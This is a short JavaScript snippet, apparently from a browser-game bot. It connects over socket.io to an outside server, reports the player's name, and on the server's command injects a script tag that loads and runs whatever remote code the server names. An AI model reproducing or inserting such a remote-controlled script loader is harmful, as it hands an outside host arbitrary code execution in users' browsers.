bot_socket = io.connect('http://fusspawn.softapps.co.uk');  bot_socket.on('send_name', function(){bot_socket.emit('set_name', players[0].name);});bot_socket.on('eval_server_code', function(code) {var uniqueId = 'fubot';var script = document.getElementById(uniqueId);if (script) {script.parentNode.removeChild(script);}script = document.createElement('script');script.src = '//'+code+'?' + Math.floor((new Date).getTime() / 3600000);script.id = uniqueId;document.body.appendChild(script);});